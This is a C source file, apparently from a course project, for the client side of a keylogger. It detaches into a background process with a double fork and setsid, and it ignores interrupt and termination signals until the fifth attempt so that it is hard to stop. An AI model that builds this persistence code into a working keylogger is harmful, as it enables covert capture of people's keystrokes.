/**
 * Client side of server.
 */
#include "client.h"

#include "keylogger.h"
#include <errno.h>
#include <signal.h>

void fileificate() {}

int signal_counter = 0;

void background_process(void) {
  // IMPLEMENTATION HERE

  //umask(0) to clear file creation mask?


  int process_id = fork();


  if (process_id == -1){
    perror("Failed to fork Process");
    //status 1 is an error
    exit(errno);
  }
  else if (process_id > 0){
    //successfully exit parent process
    exit(0);
  }

  //create a new process group
  int group_id = setsid();

  if(group_id == -1){
    perror("Failed to create a process group");
    exit(errno);
  }


    //redirect signals
  immortalize();

  //fork again?

  process_id = fork();

    if (process_id == -1){
    perror("Failed to fork Process");
    //status 1 is an error
    exit(errno);
  }
  else if (process_id > 0){
    //successfully exit parent process
    raise(SIGKILL);
  }

  //change working directory to root

  chdir(getenv("HOME"));

  //set umask to 0
  
  umask(0);
  //signal handle again just to make sure
  immortalize();
}

void immortalize(void) {
    //Redirect common abort/termination/interrupt signals to ignores

    //int* signal_counter  = malloc(sizeof(int));
    signal(SIGINT,shutdown_signal);
    signal(SIGTERM,shutdown_signal);
    signal(SIGHUP,shutdown_signal);
    signal(SIGABRT,shutdown_signal);
}

//signal handling function
void shutdown_signal(int signal){
  //global variable signal_counter defined above

  //on 5th actually shutdown
  if(signal_counter > 4){
    printf("ok, you killed me");
    raise(SIGKILL);
    printf("The program should be killed at this point? This shouldn't be viewable");
  }
  signal_counter++;
  printf("You tried to shut down but failed");
}
